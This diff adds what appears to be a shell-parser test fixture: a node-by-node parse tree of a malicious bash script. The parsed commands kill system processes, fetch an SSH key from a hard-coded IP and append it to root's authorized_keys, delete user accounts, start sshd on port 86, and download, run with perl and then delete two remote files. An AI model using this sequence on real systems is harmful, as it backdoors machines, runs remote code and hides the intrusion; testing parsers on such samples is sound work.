@@ -1,0 +1,126 @@
+CommandNode(lineno=3, pos=(29, 44), parts=[
+  WordNode(lineno=3, pos=(29, 36), word='killall'),
+  WordNode(lineno=3, pos=(37, 39), word='-9'),
+  WordNode(lineno=3, pos=(40, 44), word='init'),
+])
+CommandNode(lineno=4, pos=(45, 61), parts=[
+  WordNode(lineno=4, pos=(45, 52), word='killall'),
+  WordNode(lineno=4, pos=(53, 55), word='-9'),
+  WordNode(lineno=4, pos=(56, 61), word='crond'),
+])
+CommandNode(lineno=5, pos=(62, 90), parts=[
+  WordNode(lineno=5, pos=(62, 69), word='killall'),
+  WordNode(lineno=5, pos=(70, 72), word='-9'),
+  WordNode(lineno=5, pos=(73, 79), word='python'),
+  WordNode(lineno=5, pos=(80, 83), word='std'),
+  WordNode(lineno=5, pos=(84, 90), word='idiot*'),
+])
+CommandNode(lineno=6, pos=(91, 107), parts=[
+  WordNode(lineno=6, pos=(91, 96), word='mkdir'),
+  WordNode(lineno=6, pos=(97, 107), word='/root/.ssh'),
+])
+CommandNode(lineno=9, pos=(143, 160), parts=[
+  WordNode(lineno=9, pos=(143, 150), word='killall'),
+  WordNode(lineno=9, pos=(151, 153), word='-9'),
+  WordNode(lineno=9, pos=(154, 160), word='python'),
+])
+CommandNode(lineno=10, pos=(161, 178), parts=[
+  WordNode(lineno=10, pos=(161, 168), word='killall'),
+  WordNode(lineno=10, pos=(169, 171), word='-9'),
+  WordNode(lineno=10, pos=(172, 178), word='screen'),
+])
+ListNode(lineno=13, pos=(222, 335), parts=[
+  CommandNode(lineno=13, pos=(222, 235), parts=[
+    WordNode(lineno=13, pos=(222, 224), word='cd'),
+    WordNode(lineno=13, pos=(225, 235), word='/root/.ssh'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(235, 236)),
+  CommandNode(lineno=13, pos=(236, 269), parts=[
+    WordNode(lineno=13, pos=(236, 240), word='wget'),
+    WordNode(lineno=13, pos=(241, 269), word='http://178.18.24.165/ssh/kid'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(269, 270)),
+  CommandNode(lineno=13, pos=(270, 296), parts=[
+    WordNode(lineno=13, pos=(270, 273), word='cat'),
+    WordNode(lineno=13, pos=(274, 277), word='kid'),
+    RedirectNode(lineno=13, output=
+      WordNode(lineno=13, pos=(281, 296), word='authorized_keys'), pos=(278, 296), type='>>'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(296, 297)),
+  CommandNode(lineno=13, pos=(297, 324), parts=[
+    WordNode(lineno=13, pos=(297, 300), word='cat'),
+    WordNode(lineno=13, pos=(301, 304), word='kid'),
+    RedirectNode(lineno=13, output=
+      WordNode(lineno=13, pos=(308, 324), word='authorized_keys2'), pos=(305, 324), type='>>'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(324, 325)),
+  CommandNode(lineno=13, pos=(325, 335), parts=[
+    WordNode(lineno=13, pos=(325, 327), word='rm'),
+    WordNode(lineno=13, pos=(328, 331), word='-rf'),
+    WordNode(lineno=13, pos=(332, 335), word='kid'),
+  ]),
+])
+CommandNode(lineno=14, pos=(336, 359), parts=[
+  WordNode(lineno=14, pos=(336, 353), word='/usr/sbin/userdel'),
+  WordNode(lineno=14, pos=(354, 359), word='ucpss'),
+])
+CommandNode(lineno=15, pos=(360, 381), parts=[
+  WordNode(lineno=15, pos=(360, 377), word='/usr/sbin/userdel'),
+  WordNode(lineno=15, pos=(378, 381), word='upx'),
+])
+CommandNode(lineno=16, pos=(382, 402), parts=[
+  WordNode(lineno=16, pos=(382, 396), word='/usr/sbin/sshd'),
+  WordNode(lineno=16, pos=(397, 399), word='-p'),
+  WordNode(lineno=16, pos=(400, 402), word='86'),
+])
+CommandNode(lineno=17, pos=(403, 417), parts=[
+  WordNode(lineno=17, pos=(403, 408), word='mkdir'),
+  WordNode(lineno=17, pos=(409, 417), word='/tmp/.dq'),
+])
+CommandNode(lineno=18, pos=(418, 459), parts=[
+  WordNode(lineno=18, pos=(418, 422), word='curl'),
+  WordNode(lineno=18, pos=(423, 425), word='-O'),
+  WordNode(lineno=18, pos=(426, 436), word='/tmp/.dq/s'),
+  WordNode(lineno=18, pos=(437, 459), word='http://178.18.24.165/s'),
+])
+CommandNode(lineno=19, pos=(460, 501), parts=[
+  WordNode(lineno=19, pos=(460, 464), word='wget'),
+  WordNode(lineno=19, pos=(465, 467), word='-O'),
+  WordNode(lineno=19, pos=(468, 478), word='/tmp/.dq/s'),
+  WordNode(lineno=19, pos=(479, 501), word='http://178.18.24.165/s'),
+])
+CommandNode(lineno=20, pos=(502, 543), parts=[
+  WordNode(lineno=20, pos=(502, 506), word='curl'),
+  WordNode(lineno=20, pos=(507, 509), word='-O'),
+  WordNode(lineno=20, pos=(510, 520), word='/tmp/.dq/e'),
+  WordNode(lineno=20, pos=(521, 543), word='http://178.18.24.165/e'),
+])
+CommandNode(lineno=21, pos=(544, 585), parts=[
+  WordNode(lineno=21, pos=(544, 548), word='wget'),
+  WordNode(lineno=21, pos=(549, 551), word='-O'),
+  WordNode(lineno=21, pos=(552, 562), word='/tmp/.dq/e'),
+  WordNode(lineno=21, pos=(563, 585), word='http://178.18.24.165/e'),
+])
+CommandNode(lineno=24, pos=(636, 656), parts=[
+  WordNode(lineno=24, pos=(636, 641), word='chmod'),
+  WordNode(lineno=24, pos=(642, 645), word='755'),
+  WordNode(lineno=24, pos=(646, 656), word='/tmp/.dq/s'),
+])
+CommandNode(lineno=25, pos=(657, 677), parts=[
+  WordNode(lineno=25, pos=(657, 662), word='chmod'),
+  WordNode(lineno=25, pos=(663, 666), word='755'),
+  WordNode(lineno=25, pos=(667, 677), word='/tmp/.dq/e'),
+])
+CommandNode(lineno=28, pos=(718, 733), parts=[
+  WordNode(lineno=28, pos=(718, 722), word='perl'),
+  WordNode(lineno=28, pos=(723, 733), word='/tmp/.dq/s'),
+])
+CommandNode(lineno=29, pos=(734, 749), parts=[
+  WordNode(lineno=29, pos=(734, 738), word='perl'),
+  WordNode(lineno=29, pos=(739, 749), word='/tmp/.dq/e'),
+])
+CommandNode(lineno=30, pos=(750, 765), parts=[
+  WordNode(lineno=30, pos=(750, 752), word='rm'),
+  WordNode(lineno=30, pos=(753, 756), word='-rf'),
+  WordNode(lineno=30, pos=(757, 765), word='/tmp/.dq'),
+])
